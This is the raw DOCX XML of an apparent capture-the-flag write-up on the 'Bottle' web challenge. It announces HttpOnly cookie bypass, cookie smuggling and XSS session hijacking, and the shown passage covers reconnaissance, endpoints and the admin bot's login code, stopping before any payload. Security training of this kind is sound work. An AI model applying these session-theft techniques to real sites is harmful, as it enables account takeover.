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DB4F5" w14:textId="41355DFF" w:rsidR="001F2156" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="400" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lato" w:hAnsi="Lato"/>
          <w:color w:val="000000"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Bottle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D3FEE1" w14:textId="77777777" w:rsidR="001F2156" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="320" w:afterAutospacing="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lato" w:hAnsi="Lato"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="20A4F4"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE602D0" w14:textId="578CE5FB" w:rsidR="001F2156" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lato" w:hAnsi="Lato"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:color w:val="6D9EEB"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="26984C8E" wp14:editId="1CBB4684">
            <wp:extent cx="883920" cy="6400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392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4EA990" w14:textId="77777777" w:rsidR="001F2156" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C8FBEF7" w14:textId="2DD213CF" w:rsidR="006B2119" w:rsidRPr="001F2156" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F2156">
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Prerequisites &amp; Requirements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719DD2DC" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Basic understanding of web applications and HTTP protocols</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EAF268D" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Knowledge of JavaScript and browser behavior</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3066C6F7" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Familiarity with web security concepts, particularly XSS and cookie security</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71EBC01A" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Understanding of HTTP </w:t>
      </w:r>
      <w:r>
        <w:t>request/response flow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C35A57F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRPr="001F2156" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F2156">
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidRPr="001F2156">
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>hat will you learn?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311AE350" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>How cookie parsing vulnerabilities can lead to severe security issues</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8F365F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>HTTP-Only cookie protection bypass techniques</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6425D132" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Cookie smuggling attacks against the Bottle framework</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D76094" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Browser cookie ordering behavior exploitati</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A0D971" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Crafting advanced XSS payloads for session hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C2AF6D" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Understanding parser differentials between browsers and web frameworks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED0A750" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AF832E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Web browser with developer tools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09482A65" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Webhook service (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>webhook.site</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or similar)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308F1E63" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Basic understanding of Python and the Bottle web</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> framework</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8D908E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Knowledge of HTTP request manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEF9A90" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156" w:rsidP="001F2156">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite or similar proxy (optional but helpful)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15094D46" w14:textId="1686B94B" w:rsidR="006B2119" w:rsidRPr="001F2156" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F2156">
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidRPr="001F2156">
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>escription</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E62A6F" w14:textId="410092BE" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>MY COOKIES IS HTTP ONLY!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6780A143" w14:textId="77777777" w:rsidR="006B2119" w:rsidRPr="001F2156" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F2156">
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB77E8D" w14:textId="41831021" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r w:rsidRPr="001F2156">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C0E8F63" wp14:editId="21282B86">
            <wp:extent cx="5943600" cy="11061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EC0B0" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Upon accessing the application, we're presented with a standard web interface:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B2F522" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>http://[challenge-url]/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6772E0FB" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The applic</w:t>
      </w:r>
      <w:r>
        <w:t>ation includes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2DEFE6" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>User registration form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265927EB" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login functionality</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455D2249" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Language preference selection (English/Spanish)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F9220A" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Note-taking features after authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109B931B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Note preview capability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B673280" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Report functionality to send notes to an admin bot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01091B1E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">After registering an account (e.g., </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>test:password123</w:t>
      </w:r>
      <w:r>
        <w:t>) and logging in, we can access the note creation interface. The application allows us to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5561ED5E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Create notes with arbitrary content</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DC1414" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Preview these notes in a dedicated view</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFB1BE8" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Report notes to be viewed by an admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="456A688D" w14:textId="102421A7" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r w:rsidRPr="001F2156">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="552BC5C1" wp14:editId="575EA503">
            <wp:extent cx="5943600" cy="4319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1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9B7D3" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Examining our browser's cookies through the developer tools, we observe:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274DE1E3" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie: lang=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r>
        <w:t>session=eb600456809aa20460de4bd1da503129|1748519159|ddXX0inNh9lMGP0VwfGRsErRU6jWulbvqZ-7ZbmcZwo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DF78D6" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie has the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> flag set, which means it cannot be accessed through client-side JavaScript. This is a security measure specifically designed</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to prevent XSS attacks from stealing authentication cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252B8C80" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Let's also explore the application's structure by visiting different endpoints:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B9CD90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</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Home page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0FD697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/login</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Login page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A8516B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/register</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Registration page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B486BBC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/about</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - About page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3459DA6C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/notes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Notes listing (requir</w:t>
      </w:r>
      <w:r>
        <w:t>es authentication)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761D33E1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/notes/add</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Note creation form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595C25FD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/notes/[id]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Note viewing page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2A4070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/admin/flag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Flag endpoint (inaccessible without admin privileges)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F6E73F" w14:textId="3CB5C53C" w:rsidR="006B2119" w:rsidRPr="001F2156" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F2156">
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Searching</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65123E91" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Let's analyze key components of the source code to understand how the application fu</w:t>
      </w:r>
      <w:r>
        <w:t>nctions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F722FC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Bot Functionality</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F05DD03" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The application includes an admin bot that visits reported note URLs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFC902A" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodejavascript"/>
      </w:pPr>
      <w:r>
        <w:t>// From bot.js</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>module.exports</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    // ...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    bot: async (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>urlToVisit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) =&gt; {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        // Browser setup code...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        // Function to log in before vi</w:t>
      </w:r>
      <w:r>
        <w:t>siting the page</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        async function login(page) {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            console.log("Logging in...");</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            await </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>page.goto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(`${CONFIG.APPURL}/admin-login`, {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>waitUntil</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: 'networkidle2'</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            });</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            await </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>page.type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>('#username',</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 'admin');</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            await </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>page.type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>('#password', CONFIG.ADMINPASS);</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            await </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>page.click</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>('button[type="submit"]');</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            await </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>page.waitForNavigation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">({ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>waitUntil</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: 'networkidle2' });</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            console.log("Login successful");</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">       // Perform login</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        await login(page);</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        console.log(`bot visiting ${</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>urlToVisit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>}`)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        await </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>page.goto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>urlToVisit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>waitUntil</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: 'networkidle2'</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        });</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        // Wait for a few seconds then close</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        awai</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t new Promise(resolve =&gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>setTimeout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(resolve, 5000));</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        await </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>browser.close</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>();</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        // ...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A334718" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>This reveals several important aspects:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3B2128" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The bot logs in as an administrator before visiting any URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3373F9A3" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It uses Puppeteer (headless browser) to </w:t>
      </w:r>
      <w:r>
        <w:t>render pages with JavaScript enabled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033CB0AB" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The admin session contains credentials needed to access the flag</w:t>
